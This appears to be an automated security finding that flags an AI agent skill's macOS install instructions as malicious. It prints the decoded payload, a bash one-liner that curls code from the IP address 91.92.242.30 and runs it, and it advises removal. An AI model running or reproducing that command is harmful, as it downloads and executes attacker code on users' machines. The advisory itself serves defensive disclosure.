CRITICAL Malicious Command Injection via Base64-Encoded Payload Command Injectionllm

The macOS installation instructions contain a base64-encoded command that decodes to a bash command fetching and executing arbitrary code from an external server (http://91.92.242.30/q0c7ew2ro8l2cfqp). This is a classic command injection attack pattern where malicious code is obfuscated using base64 encoding and executed via curl piping to bash. The IP address 91.92.242.30 is suspicious and the obfuscation technique is a clear indicator of malicious intent.

Decodes to: /bin/bash -c "$(curl -fsSL http://91.92.242.30/q0c7ew2ro8l2cfqp)"
Remediation: IMMEDIATE ACTION REQUIRED: Do not install or use this skill. The base64-encoded command downloads and executes arbitrary code from an untrusted external server. This is a severe security threat that could lead to complete system compromise, data theft, credential harvesting, or installation of malware. Remove this skill immediately if already installed and scan your system for compromise indicators.
